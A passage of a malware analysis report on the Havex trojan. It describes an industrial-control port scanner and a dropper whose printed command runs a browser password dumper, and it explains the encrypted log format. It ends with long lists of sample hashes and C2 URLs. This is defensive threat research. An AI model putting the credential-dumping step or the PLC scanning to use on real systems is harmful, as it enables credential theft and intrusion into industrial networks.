; port 502, used by Modbus / Modicon PLC\n   dd 66h  ; port 102, used by Siemens PLC\n   dd 2BE2h port 11234 sed b Meas resoft ScadaPro\n\n```\n\n-----\n\n```\n   dd 3071h ; port 12401, used by 7-Technologies IGSS SCADA\n\n```\n- Example content of log file:\n```\n   [!]Start\n   [+]Get WSADATA\n   [+]Local: 192.168.56.11\n   No available ports Host: 192.168.56.1\n   No available ports Host: 192.168.56.51\n   No available ports Host: 192.168.56.151\n   No available ports Host: 192.168.56.201\n   No available ports Host: 192.168.56.101\n   No available ports Host: 192.168.56.2\n   No available ports Host: 192.168.56.152\n   No available ports Host: 192.168.56.52\n   (...)\n\n```\n- Error related strings:\n```\n   [-]Can not get local ip\n   [-]Threads number > Hosts number\n   [-]Can not create socket:\n   [-]Connection error\n   [!]End\n\n```\n**PSW dropper module**\n\nSHA-256: 71e05babc107f5e52f1a4c3ea6261c472d2649c0b179395304c420eaa54e2062\nsize: 1427968\ncompiled: Mon, 09 Jul 2012 07:38:11 UTC\n\nThis module is used to decompress (bzip2) and drop a password dumping tool from resource DLL1\nA8 409 to %TEMP%\\bp.exe and run it with the following command:\n```\n%TEMP%\\bp.exe %TEMP%\\~tmp1237.txt”\n\n```\nSaved log is then copied to %TEMP%\\<rand>.tmp.yls file.\n\n3rd stage tool: password stealer\n\nSHA-256: cb5341eac0476a4c2b64a5fe6b8eb8c5b01b4de747524208c303aba6825aef1d\nsize: 2988544\n\n\n-----\n\ncompiled: Thu, 02 Feb 2012 09:50:29 UTC\n\nThis file was dropped and executed by the PSW dropper module (71e05babc107f5e52f1a4c3ea6261\nc472d2649c0b179395304c420eaa54e2062).\nThis is a customized (?) version of BrowserPasswordDecryptor 2.0 - a free password recovery tool,\ndeveloped by SecurityXploded:\n\nhxxp://securityxploded.com/browser-password-decryptor.php\n\nDescription from the developers’ website:\n\n_Browser Password Decryptor is the FREE software to instantly recover website login passwords stored by_\n_popular web browsers._\n\n_Currently it can recover saved login passwords from following browsers:_\n\n_• Firefox_\n\n_• Internet Explorer_\n\n_• Google Chrome_\n\n_• Google Chrome Canary/SXS_\n\n_• CoolNovo Browser_\n\n_• Opera Browser_\n\n_• Apple Safari_\n\n_• Comodo Dragon Browser_\n\n_• SeaMonkey Browser_\n\n_• SRWare Iron Browser_\n\n_• Flock Browser_\n\n_Features:_\n\n_• Instantly decrypt and recover stored encrypted passwords from popular web browsers._\n\n_• Right Click Context Menu to quickly copy the password_\n\n_• Recover password of any length and complexity._\n\n_• Automatically discovers all supported Applications and recovers all the stored passwords._\n\n_• Sort feature to arrange the recovered passwords in various order to make it easier to search through_\n_100’s of entries._\n\n_• Save the recovered password list to HTML/XML/Text/CSV file_\n\n_• Easier and faster to use with its enhanced user friendly GUI interface._\n\n_• Support for local Installation and uninstallation of the software._\n\nExample of file content:\n\n\n-----\n\n```\n*************************************************\nBrowser Password Recovery Report                 \n*************************************************\n Password List\n***********************************************************************************\n Browser: Firefox\n Website URL: https://accounts.google.com\n User Login: mygmail\n Password: gmailpassword\n----------------------------------------------------------------------------------- Browser: Firefox\n Website URL: https://www.facebook.com\n User Login: myfacebook@example.com\n Password: ihatefacebooksomuch\n----------------------------------------------------------------------------------- Browser: Opera\n Website URL: https://twitter.com\n User Login: mytwitter321\n Password: mypassword123\n----------------------------------------------------------------------------------- Browser: Opera\n Website URL: https://login.yahoo.com\n User Login: yahaccount\n Password: yahpwd\n-----------------------------------------------------------------------------------\n```\n____________________________________________________________________________________\nProduced by BrowserPasswordDecryptor from http://securityxploded.com/browser-passworddecryptor.php\n\n**Log Encryption In Modules**\n\nEach module is capable of creating a log file (.yls) which is encrypted and stored on disk. The\nencryption library used by the modules (as well as the most recent versions of Havex) is handled by\n\n\n-----\n\nthe RSAeuro library. They recompiled the library several times using different compiler settings and\noptimization (depending of modules/Havex) which makes fingerprinting the functions a bit tedious.\n\nOnce the log has been compressed using bzip2, the modules use the library to generate a random 192 bit\n3DES key (168 bit effective) and a 64 bit Initialization Vector. The function used to do so is R_GenerateBytes\nwhich is using the MD5 algorithm previously seeded by the R_RandomCreate function (Also using MD5):\n\nOnce the key and the IV have been generated, the 3DES algorithm is initialized:\n\n\n-----\n\nOnce 3DES is initialized, the next step is to RSA encrypt the 3DES KEY using the RSAPublicEncrypt\nfunction. It is essentially creating the PKCS #1 padding block around the key and then calling the\nrsapublicencrypt function.\n\nExample of a layout where 0x42 is the PKCS#1 padding block and 0x41 the 3DES key (original\nvalues overwritten for clarification purpose):\n\nThe rsapublicencrypt is basically a wrapper to various big num functions used to compute RSA:\n\n\n-----\n\nN parameter in one sample:\n\nThe E parameter is the standard 0x10001\n\nAfter the 3DES key is encrypted using RSA, the log files are encrypted.\nThe final encrypted log file layout looks like the following: (important parameters overwritten for\nclarity):\n\nThe YLS file format can be described as follows:\n\n- SIZE OF RSA Identifier: 0x29 in the figure above\n\n- RSA ID: “39ee448cf196304cfe9c6b1c2e436”. (Used by attackers to identify which RSA key was\nused to encrypt the 3DES Key.\n\n- BLOCKSIZE: 128 bytes (24 bytes from 3DES key and 104 from PKCS padding block)\n\n- ENCRYPTED 3DES KEY : In yellow on the figure above, replaced by “C”\n\n- 3DES Initialization Vector: In red on the figure above, replaced by “I”. Mandatory to decrypt\nlogs.\n\n- 3DES ENCRYPTED LOG bytes\n\n\n-----\n\nOnly the attackers can decrypt such a log file. They can identify which Public RSA Key was used\nfrom the identifier, and decrypt the 3DES key using their Private RSA Key. From there, they can use\nthe 3DES Key and the Initialization Vector which is present in clear form to decrypt the log file.\n\n\n-----\n\n## Havex sample details by version\n\nHAVEX version 01\n\nSHA-256: 170e5eb004357dfce6b41de8637e1dbeb87fa58e8b54a2031aac33afb930f3c8\nSize: 226304\nCompiled: Wed, 28 Sep 2011 07:36:00 UTC\nC2 urls: onemillionfiles.com/server_package/system/application/controllers/list.php?id=\nwww.autoyoung.com/system/ext/Smarty/plugins/function.search.php?id=\n\nHAVEX version 02\n\nSHA-256: b647f883911ff20f776e0a42564b13ef961fa584ebd5cfce9dd2990bca5df24e\nSize: 226304\nCompiled: Wed, 28 Sep 2011 02:15:23 UTC\n\nSHA-256: fb30c3bb1b25b3d4cca975f2e0c45b95f3eb57a765267271a9689dd526658b43\nSize: 226304\nCompiled: Wed, 28 Sep 2011 04:09:41 UTC\n\nSHA-256: 6606dd9a5d5182280c12d009a03b8ed6179872fcb08be9aa16f098250cc5b7a7\nSize: 226304\nCompiled: Wed, 28 Sep 2011 07:37:30 UTC\n\nC2 URLs: _(common for all samples above)_\nonemillionfiles.com/server_package/system/application/controllers/list.php?id=\nwww.autoyoung.com/system/ext/Smarty/plugins/function.search.php?id=\n\nHAVEX version 0F\n\nSHA-256: 7c1136d6f5b10c22698f7e049dbc493be6e0ce03316a86c422ca9b670cb133aa\nSize: 401456\nCompiled: Thu, 27 Oct 2011 07:32:55 UTC\n\nSHA-256: 4ff5f102f0f1284a189485fc4c387c977dd92f0bc6a30c4d837e864aed257129\nSize: 400384\nCompiled: Thu, 27 Oct 2011 07:32:55 UTC\nSHA-256: bacac71fcc61db9b55234d1ccf45d5fffd9392c430cdd25ee7a5cea4b24c7128\nSize: 401527\n\n\n-----\n\nCompiled: Thu, 27 Oct 2011 07:32:55 UTC\n\nC2 URLs: atampy.com/wordpress/wp-includes/pomo/dx.php?id=\nwww.intellbet.com/_lib/db_simple/Mysqli.php?id=\nwww.activateav.com/wp-includes/pomo/dx.php?id=\n\nHAVEX version 012\n\nSHA-256: 0c20ffcdf2492ccad2e53777a0885c579811f91c05d076ff160684082681fe68\nSize: 400384\nCompiled: Thu, 27 Oct 2011 11:38:42 UTC\n\nSHA-256: 31db22caf480c471205a7608545370c1b3c0c9be5285a9ef2264e856052b66b4\nSize: 401519\nCompiled: Thu, 27 Oct 2011 11:38:42 UTC\n\nSHA-256: 56a1513bcf959d5df3ff01476ddb4b158ce533658ab7d8dd439324b16f193ac2\nSize: 401519\nCompiled: Thu, 27 Oct 2011 12:02:20 UTC\n\nC2 URLs: atampy.com/wordpress/wp-includes/pomo/dx.php?id=\nwww.intellbet.com/_lib/db_simple/Mysqli.php?id=\nwww.activateav.com/wp-includes/pomo/dx.php?id=\n\nHAVEX version 013\n\nSHA-256: 9517a412633b8ebeac875a2da7fe119b72efad62859dc1719b84d561792a9033\nSize: 401519\nCompiled: Thu, 27 Oct 2011 11:41:14 UTC\nC2 URLs: atampy.com/wordpress/wp-includes/pomo/dx.php?id=\nwww.intellbet.com/_lib/db_simple/Mysqli.php?id=\nwww.activateav.com/wp-includes/pomo/dx.php?id=\n\nHAVEX version 014\n\nSHA-256: 02e5191078497be1e6ea8bac93b6cfb9b3ee36a58e4f7dd343ac1762e7f9301e\nSize: 402543\nCompiled: Mon, 07 Nov 2011 09:40:37 UTC\nSHA-256: d755904743d48c31bdff791bfa440e79cfe1c3fc9458eb708cf8bb78f117dd07\nSize: 401408\n\n\n-----\n\nCompiled: Mon, 07 Nov 2011 09:40:37 UTC\n\nSHA-256: 65a4332dfe474a8bb9b5fa35495aade453da7a03eb0049211e57b5660d08d75c\nSize: 401408\nCompiled: Mon, 07 Nov 2011 09:40:37 UTC\n\nSHA-256: 60f86898506f0fdf6d997f31deff5b6200a6969b457511cc00446bd22dd1f0a4\nSize: 401408\nCompiled: Mon, 07 Nov 2011 09:40:37 UTC\n\nC2 URLs: 7adharat.com/forum/includes/search/index_search.php?id=\nwmr.ueuo.com/advertisers/TEMP/dbaza.php?id=\nwww.insigmaus.com/wp-includes/pomo/dx.php?id=\nwww.soluciones4web.com/wp-includes/pomo/dx.php?id=\n\nHAVEX version 017\n\nSHA-256: bcdcb4b5e9aaaee2c46d5b0ed16aca629de9faa5e787c672191e0bdf64619a95\nSize: 401968\nCompiled: Fri, 02 Dec 2011 14:07:10 UTC\nC2 URLs: hq.mission1701.com/include/plugins/search.php?id=\niclt.am/style/default/search.php?id=\njoomware.org/modules/mod_search/search.php?id=\n\nSHA-256: ee53e509d0f2a3c888232f2232b603463b421b9c08fe7f44ed4eead0643135d3\nSize: 399494\nCompiled: Fri, 02 Dec 2011 14:14:05 UTC\n\nSHA-256: 646c94a0194ca70fbe68c444a0c9b444e195280f9a0d19f12393421311653552\nSize: 398532\nCompiled: Fri, 02 Dec 2011 14:14:05 UTC\n\nC2 URLs: nsourcer.com/modules/menu/menu.php?id=\nwww.onehellofaride.com/wp-includes/pomo/dsx.php?id=\ntripstoasia.com/wp-content/plugins/idx.php?id=\n\nSHA-256: 2efd5355651db8e07613e74b1bf85b50273c1f3bce5e4edbedea0ccdff023754\nSize: 400434\nCompiled: Sat, 03 Dec 2011 05:47:06 UTC\n\n\n-----\n\nSHA-256: aafbf4bba99c47e7d05c951ad964ce09493db091ba5945e89df916c6fa95d101\nSize: 399154\nCompiled: Sat, 03 Dec 2011 05:47:06 UTC\n\nSHA-256: 837e68be35c2f0ab9e2b3137d6f9f7d16cc387f3062a21dd98f436a4bcceb327\nSize: 398918\nCompiled: Sat, 03 Dec 2011 05:47:06 UTC\n\nSHA-256: abdb2da30435430f808b229f8b6856fafc154a386ef4f7c5e8de4a746e350e0c\nSize: 394206\nCompiled: Sat, 03 Dec 2011 05:47:06 UTC\nC2 URLs: serviciosglobal.com/inc/search.php?id=\ntheluvsite.com/modules/search/src.php?id=\n\nHAVEX version 018\n\nSHA-256: a2fe7a346b39a062c60c50167be7dd4f6a8175df054faa67bff33ec42b1072d9\nSize: 401968\nCompiled: Sat, 03 Dec 2011 05:55:08 UTC\nC2 URLs: motahariblog.com/core/date/date.php?id=\nwww.rscarcare.com/modules/Manufacturers/source.php?id=\nroxsuite.com/modules/mod_search/mod_search.src.php?id=\n\nSHA-256: ce99e5f64f2d1e58454f23b4c1de33d71ee0b9fcd52c9eb69569f1c420332235\nSize: 401408\nCompiled: Thu, 10 Nov 2011 06:11:50 UTC\nC2 URLs: productosmiller.com/includes/modules/iddx.php?id=\nsabioq.com/Connections/_notes/dxml.php?id=\nvamcart.com/modules/system/blocks/system.php?id=\njo.contrasso.com/chief-cooker/tiny_mce/plugins/searchreplace/edit.php?id=\n\nSHA-256: e73f8b394e51348ef3b6cea7c5e5ecc2ee06bb395c5ac30f6babb091080c1e74\nSize: 402543\nCompiled: Wed, 09 Nov 2011 10:51:51 UTC\nC2 URLs: www.expathiring.com/generator/pages/page-index.php?id=\nijbeta.com/wp-includes/pomo/dx.php?id=\ngoandgetstaffed.com.au/system/modules/miscellaneous/_index.php?id=\ninsurancelower.com/tareas/include/_php.php?id=\nHAVEX version 019\n\n\n-----\n\nSHA-256: 8d343be0ea83597f041f9cbc6ea5b63773affc267c6ad99d31badee16d2c86e5\nSize: 401968\nCompiled: Fri, 02 Dec 2011 13:46:14 UTC\nC2 URLs: pekanin.freevar.com/include/template/isx.php?id=\nrandallweil.com/cms/tinymce/examples/access.php?id=\nshwandukani.ueuo.com/modules/mod_search/mod_research.php?id=\n\nSHA-256: 0850c39a7fcaa7091aaea333d33c71902b263935df5321edcd5089d10e4bbebb\nSize: 400896\nCompiled: Fri, 02 Dec 2011 14:05:30 UTC\nC2 URLs: hq.mission1701.com/include/plugins/search.php?id=\niclt.am/style/default/search.php?id=\njoomware.org/modules/mod_search/search.php?id=\n\nSHA-256: e029db63346c513be42242e268559174f6b00d818e00d93c14bd443314f65fe5\nSize: 400896\nCompiled: Fri, 02 Dec 2011 14:17:40 UTC\nC2 URLs: nsourcer.com/modules/menu/menu.php?id=\nwww.onehellofaride.com/wp-includes/pomo/dsx.php?id=\ntripstoasia.com/wp-content/plugins/idx.php?id=\n\nHAVEX version 01A\n\nSHA-256: f65d767afd198039d044b17b96ebad54390549c6e18ead7e19e342d60b70a2c3\nSize: 406445\nCompiled: Fri, 09 Dec 2011 10:30:42 UTC\n\nSHA-256: 698ec413986dc7fc761b1a17624ffffb1590902020b9d0cd5d9a6013c67d9100\nSize: 402173\nCompiled: Fri, 09 Dec 2011 10:30:42 UTC\n\nSHA-256: 022da314d1439f779364aba958d51b119ac5fda07aac8f5ced77146dbf40c8ac\nSize: 408277\nCompiled: Fri, 09 Dec 2011 10:30:42 UTC\nNotes: file is corrupted\n\nSHA-256: b8f2fdddf7a9d0b813931e0efe4e6473199688320d5e8289928fe87ce4b1d068\nSize: 402609\nCompiled: Fri, 09 Dec 2011 10:30:42 UTC\n\n\n-----\n\nSHA-256: 4f3ceab96fb55d0b05380a1d95bb494ca44d7a9d7f10ded02d5b6fc27c92cb05\nSize: 409042\nCompiled: Fri, 09 Dec 2011 10:30:42 UTC\n\nSHA-256: 7081455301e756d6459ea7f03cd55f7e490622d36a5a019861e6b17141f69bd0\nSize: 405517\nCompiled: Fri, 09 Dec 2011 10:30:42 UTC\n\nC2 URLs: chimesy.com/kurdish/modules/Statistics/source.php?id=\nnewdawnkenya.com/modules/mod_search/src.php?id=\nwww.cubasitours.com/htmlMimeMail5/ejemplo/source.php?id=\n\nSHA-256: bb3529aa5312abbee0cfbd00f10c3f2786f452a2ca807f0acbd336602a13ac79\nSize: 409136\nCompiled: 2011-12-09 11:47:50\nC2 URLs: geointeres.com/engine/modules/source.php?id=\nojoobo.com/modules/forum/forum-source.php?id=\nwww.prosperis.com/cms/sections/source.php?id=\n\nHAVEX version 01B\n\nSHA-256: 8da93bc4d20e5f38d599ac89db26fc2f1eecbf36c14209302978d46fc4ce5412\nSize: 2031109\nCompiled: Tue, 13 Dec 2011 06:14:15 UTC\nNotes: Corrupted / nested file\n\nSHA-256: 224e8349ba128f0ab57bdebef5287f4b84b9dccbc2d8503f53f6333efd5f9265\nSize: 422871\nCompiled: Tue, 13 Dec 2011 06:14:15 UTC\n\nC2 URLs: ytu.am/modules/mod_search/source.php?id=\ntallhoody.com/wp-includes/pomo/idx.php?id=\nwww.prosperis.com/cms/email/mail.php?id=\n\nHAVEX version 01C\n\nSHA-256: a05b53260c2855829226dffd814022b7ff4750d278d6c46f2e8e0dc58a36a1f9\nSize: 2031109\nCompiled: Fri, 16 Dec 2011 09:05:34 UTC\nNotes: Corrupted / nested file\n\n\n-----\n\nSHA-256: 0f4046be5de15727e8ac786e54ad7230807d26ef86c3e8c0e997ea76ab3de255\nSize: 418426\nCompiled: Fri, 16 Dec 2011 08:57:55 UTC\nC2 URLs: geointeres.com/engine/modules/source.php?id=\nojoobo.com/modules/forum/forum-source.php?id=\nwww.prosperis.com/cms/sections/source.php?id=\n\nSHA-256: 3a88ff66f4eb675f0c3e6c5f947c012945c4e15b77a2cd195de8a8aba23ccb29\nSize: 420874\nCompiled: Tue, 20 Dec 2011 07:06:16 UTC\nC2 URLs: ispacs.com/cna/pages.cn/cna_source.php?id=\nstrategyofroulette.com/app/usr/usr_src.php?id=\nwww.meortemple.com/wp-includes/pomo/idx.php?id=\n\nHAVEX version 01D\n\nSHA-256: 66ec58b4bdcb30d1889972c1ee30af7ff213deece335f798e57ff51fe28752e3\nSize: 2045717\nCompiled: Wed, 21 Dec 2011 08:55:59 UTC\nNotes: Corrupted / nested file\n\nSHA-256: 83e57d8f3810a72a772742d4b786204471a7607e02fa445c3cd083f164cc4af3\nSize: 2031109\nCompiled: Wed, 21 Dec 2011 08:58:09 UTC\nNotes: Corrupted / nested file\nC2 URLs: giant99.com/site-admin/pages/source.php?id=\nabainternationaltoursandtravel.com/hiking_Safaris/source.php?id=\nwww.nahoonservices.com/wp-includes/pomo/idx.php?id=\n\nSHA-256: 170596e88b26f04d349f6014d17a88026ec55eab44888e2a9bb4dd90a79f6878\nSize: 422960\nCompiled: Thu, 29 Dec 2011 07:17:39 UTC\nSource Url:  ijbeta.com/wp-includes/pomo/ambigos0.jpg\n\nSHA-256: 0a0a5b68a8a7e4ed4b6d6881f57c6a9ac55b1a50097588e462fe8d3c486158bf\nSize: 421947\nCompiled: Thu, 29 Dec 2011 07:17:39 UTC\nC2 URLs: thecafe7.com/modules/mod_newsflash/mod_newsflash_idx.php?id=\nthecafe7 com/modules/mod whosonline/src php?id=\n\n\n-----\n\nrchdmtnez.com/modules/mod_search/source.php?id=\n\nSHA-256: 5a13d0c954280b4c65af409376de86ac43eb966f25b85973a20d330a34cdd9a6\nSize: 417296\nCompiled: Tue, 10 Jan 2012 12:27:57 UTC\n\nSHA-256: 6296d95b49d795fa10ae6e9c4e4272ea4e1444105bddbf45b34ee067b2603b38\nSize: 422624\nCompiled: Tue, 10 Jan 2012 12:27:57 UTC\n\nC2 URLs: dominioparayoani.com/wp-includes/pomo/source.php?id=\nwww.espadonline.com/forum/includes/block/source.php?id=\naptguide.3dtour.com/includes/cloudfusion/sc4.class.php?id=\n\nSHA-256: e42badd8fb20f1bc72b1cec65c42a96ee60a4b52d19e8f5a7248afee03646ace\nSize: 401788\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: 487eaf5cc52528b5f3bb27ba53afffb6d534068b364a41fc887b8c1e1485795a\nSize: 421467\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: 2221c2323fb6e30b9c10ee68d60b7d7be823911540bb115f75b2747d015e35f9\nSize: 409048\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: c4e2e341689799281eaef47de75f59edceaba281398b41fe7616436f247ab93d\nSize: 415640\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: b0faba6156c7b0cd59b94eeded37d8c1041d4b8dfa6aacd6520a6d28c3f02a5e\nSize: 418118\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: 1d768ebfbdf97ad5282e7f85da089e174b1db760f1cbdca1a815e8e6245f155a\nSize: 422416\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: 45abd87da6a584ab2a66a06b40d3c84650f2a33f5f55c5c2630263bc17ec4139\nSize: 422452\n\n\n-----\n\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: 439e5617d57360f76f24daed3fe0b59f20fc9dade3008fd482260ba58b739a23\nSize: 422117\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\n\nSHA-256: 59af70f71cdf933f117ab97d6f1c1bab82fd15dbe654ba1b27212d7bc20cec8c\nSize: 423472\nCompiled: Tue, 10 Jan 2012 14:04:49 UTC\nSource Url:  ijbeta.com/wp-includes/pomo/ambigos0.jpg\n\nC2 URLs: ktbits.com/engine/modules/source.php?id=\nrosesci.com/mail/q.source.php?id=\nwww.jterps.com/wp-includes/pomo/idx.php?id=\n\nSHA-256: d89a80a3fbb0a4a40157c6752bd978bc113b0c413e3f73eb922d4e424edeb8a7\nSize: 420065\nCompiled: Tue Jan 10 14:04:49 2012 UTC\nC2 URLs: ktbits.com/engine/modules/source.php?id=\nrosesci.com/mail/q.source.php?id=\nwww.jterps.com/wp-includes/pomo/idx.php?id=\n\nHAVEX version 01E\n\nSHA-256: 4cf75059f2655ca95b4eba11f1ce952d8e08bb4dbcb12905f6f37cf8145a538d\nSize: 423472\nCompiled: Tue, 17 Jan 2012 07:26:25 UTC\nSource Url:  ijbeta.com/wp-includes/pomo/ambigos0.jpg\n\nSHA-256: b3b01b36b6437c624da4b28c4c8f773ae8133fca9dd10dc17742e956117f5759\nSize: 423439\nCompiled: Tue, 17 Jan 2012 07:26:25 UTC\n\nC2 URLs: arsch-anus.com/engine/modules/source.php?id=\nal-mashkoor.com/php/mail/source.php?id=\nbasecamp.100icons.com/ibresource/forumengine/mzh-front-20090600.php?id=\n\nSHA-256: 24be375f0e11d88210e53f15cc08d72ab6c6287676c3fe3c6f70b513e5f442ed\nSize: 419629\nCompiled: Tue 17 Jan 2012 07:29:35 UTC\n\n\n-----\n\nSHA-256: e38aa99eff1f9fedd99cf541c3255e99f3276839a883cadb6e916649522729e3\nSize: 418320\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: d588e789f0b5914bd6f127950c5daf6519c78b527b0ed7b323e42b0613f6566f\nSize: 422285\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: 2c109406998723885cf04c3ced7af8010665236459d6fe610e678065994154d4\nSize: 415684\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: 13da3fe28302a8543dd527d9e09723caeed98006c3064c5ed7b059d6d7f36554\nSize: 418604\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: ecb097f3367f0155887dde9f891ff823ff54ddfe5217cdbb391ea5b10c5a08dc\nSize: 417145\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: 85d3f636b515f0729c47f66e3fc0c9a0aacf3ec09c4acf8bf20a1411edcdc40a\nSize: 416709\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: c66525285707daff30fce5d79eb1bdf30519586dfec4edf73e4a0845fd3d0e1c\nSize: 418037\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: 94d4e4a8f2d53426154c41120b4f3cf8105328c0cc5d4bd9126a54c14b296093\nSize: 415861\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: 59c4cba96dbab5d8aa7779eac18b67b2e6f8b03066eb092415d50dff55e43b72\nSize: 417733\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nSHA-256: b139829440aabe33071aa34604f739d70f9a0a3b06051f3190aabf839df2d408\nSize: 422112\nCompiled: Tue 17 Jan 2012 07:29:35 UTC\n\n\n-----\n\nSHA-256: 72ff91b3f36ccf07e3daf6709db441d2328cecab366fd5ff81fc70dd9eb45db8\nSize: 421677\nCompiled: Tue, 17 Jan 2012 07:29:35 UTC\n\nC2 URLs: basecamp.turbomilk.com/turbomilk/contractors2/idx.php?id=\nbbpdx.com/includes/xpath/xpath.src.php?id=\niqaws.com/catalog/install/source.php?id=\n\nSHA-256: 49c1c5e8a71f488a7b560c6751752363389f6272d8c310fee78307dc9dcd3ee2\nSize: 423472\nCompiled: Mon, 30 Jan 2012 11:10:17 UTC\nC2 URLs: familienieuwland.com/Schotland_files/_vti_cnf/index2.php?id=\nserviciosglobal.com/TPV/src.php?id=\nla5taavenida.com/wp-content/themes/citylight-idea-10/citylight-idea-10/idx.php?id=\n\nSHA-256: 2c37e0504b98413e0308e44fd84f98e968f6f62399ea06bc38d3f314ee94b368\nSize: 423472\nCompiled: Mon, 27 Feb 2012 09:09:44 UTC\nSource url: ijbeta.com/wp-includes/pomo/ambigos0.jpg\nC2 URLs: stalprof.com.ua/includes/domit/src.php?id=\nwww.cometothetruth.com/cms/tinymce/examples/src.php?id=\npornoxxx1.com/engine/ajax/src.php?id=\n\nHAVEX version 01F\n\nSHA-256: 7e0dafedd01d09e66524f2345d652b29d3f634361c0a69e8d466dcbdfd0e3001\nSize: 423472\nCompiled: Tue, 07 Feb 2012 06:22:05 UTC\n\nSHA-256: 6e92c2d298e25bcff17326f69882b636150d2a1af494ef8186565544f0d04d3d\nSize: 446464\nCompiled: Tue, 07 Feb 2012 06:22:05 UTC\n\nC2 URLs: ispacs.com/cna/pages.cn/cna_source.php?id=\nstrategyofroulette.com/app/usr/usr_src.php?id=\nwww.meortemple.com/wp-includes/pomo/idx.php?id=\n\nSHA-256: d71da8a59f3e474c3bcd3f2f00fae0b235c4e01cd9f465180dd0ab19d6af5526\nSize: 421081\n\n\n-----\n\nCompiled: Tue, 14 Feb 2012 14:34:23 UTC\n\nSHA-256: 61969cd978cd2de3a13a10510d0dea5d0d3b212209804563ed3d42033a9d0f54\nSize: 415525\nCompiled: Tue, 14 Feb 2012 14:34:23 UTC\n\nSHA-256: 0ea750a8545252b73f08fe87db08376f789fe7e58a69f5017afa2806046380a5\nSize: 423472\nCompiled: Tue, 14 Feb 2012 14:34:23 UTC\n\nC2 URLs: dayniilecom.com/index_files/iibka300_files/source.php?id=\nred-opus.com/_vti_bin/_vti_aut/source.php?id=\nwww.cetlot.com/wp-includes/pomo/idx.php?id=\n\nSHA-256: 2f24c7ccbd7a9e830ed3f9b3b7be7856e0cc8c1580082433cbe9bf33c86193c6\nSize: 416221\nCompiled: Tue, 14 Feb 2012 14:38:41 UTC\n\nC2 URLs: peterbogdanov.com/php/phpmailer/phpdoc/src.php?id=\nwww.behrendt-pasewalk.de/blog/wp-content/plugins/source.php?id=\nwww.a-knoblach.de/russland-blog/functions/locnav/pfeil_src.php?id=\n\nSHA-256: aef82593822a934b77b81ebc461c496c4610474727539b0b6e1499ca836f0dee\nSize: 423472\nCompiled: Wed Feb 8 06:53:30 2012 UTC\nC2 URLs: ytu.am/modules/mod_search/source.php?id=\ntallhoody.com/wp-includes/pomo/idx.php?id=\nwww.prosperis.com/cms/email/mail.php?id=\n\nHAVEX version 020\n\nSHA-256: 224e8349ba128f0ab57bdebef5287f4b84b9dccbc2d8503f53f6333efd5f9265\nSize: 422871\nCompiled: Tue, 13 Dec 2011 06:14:15 UTC\nC2 URLs: ytu.am/modules/mod_search/source.php?id=\ntallhoody.com/wp-includes/pomo/idx.php?id=\nwww.prosperis.com/cms/email/mail.php?id=\n\nSHA-256: 2f593c22a8fd0de3bbb57d26320446a9c7eed755ae354957c260908c93d8cf79\nSize: 460848\n\n\n-----\n\nCompiled: Mon, 12 Mar 2012 11:54:12 UTC\nC2 URLs: www.rscarcare.com/modules/Manufacturers/source.php?id=\nrcdm-global.de/plugins/search/content/source.php?id=\nwww.eriell.com/services/photo/source.php?id=\n\nSHA-256: cd019e717779e2d2b1f4c27f75e940b5f98d4ebb48de604a6cf2ab911220ae50\nSize: 459824\nCompiled: Tue, 01 May 2012 10:54:35 UTC\nC2 URLs: blog.iclt.am/wp-includes/pomo/src.php?id=\ncoma.nsourcer.com/modules/search/frontend/default/src.php?id=\nwww.rutravel.com/admin/include/source.php?id=\n\nHAVEX version 021\n\nSHA-256: edb7caa3dce3543d65f29e047ea789a9e429e46bed5c29c4748e656285a08050\nSize: 458119\nCompiled: Sat, 09 Jun 2012 06:49:43 UTC\n\nSHA-256: a3a6f0dc5558eb93afa98434020a8642f7b29c41d35fa34809d6801d99d8c4f3\nSize: 460848\nCompiled: Sat, 09 Jun 2012 06:49:43 UTC\n\nC2 URLs: swissitaly.com/includes/phpmailer/class.pop3.php?id=\nlkgames.com/fr/free-game-action-ball-2/source.php?id=\nartem.sataev.com/blog/wp-includes/pomo/src.php?id=\n\nHAVEX version 022\n\nSHA-256: 43608e60883304c1ea389c7bad244b86ff5ecf169c3b5bca517a6e7125325c7b\nSize: 462848\nCompiled: Mon, 17 Sep 2012 09:43:36 UTC\nC2 URLs: blog.vraert.com/wp-includes/pomo/src.php?id=\nwildlifehc.org/nest/services/source.php?id=\nwww.suma-shop.ir/modules/sekeywords/source.php?id=\nwww.sdfgdsdf23_sdgdstavolozza.4lf.me/z/j/tiny_mce/plugins/xhtmlxtras/src.\nphp?id=\n\nSHA-256: 98bd5e8353bc9b70f8a52786365bcdb28bd3aef164d62c38dae8df33e04ac11a\nSize: 463920\nCompiled: Tue 17 Jul 2012 06:35:58 UTC\n\n\n-----\n\nC2 URLs: lafollettewines.com/includes/phpInputFilter/source.php?id=\nalexvernigor.com/includes/phpmailer/source.php?id=\nwww.recomiendalos.com/inc/eml_templates/source.php?id=\nwww.jklgdf789dh43.com/7890890778yer/rtrtyr/rty/rty/ery/er.php?id=\n\nSHA-256: da3c1a7b63a6a7cce0c9ef01cf95fd4a53ba913bab88a085c6b4b8e4ed40d916\nSize: 463920\nCompiled: Tue, 28 Aug 2012 13:53:28 UTC\nC2 URLs: artsepid.com/plugin/contact-form/source.php?id=\nxezri.net/chat/etiraf/source.php?id=\nbukzahid.org.ua/engine/modules/src.php?id=\nwww.sdfgdsdf2354235il.com/inc/eml_templates/source.php?id=\n\nSHA-256: 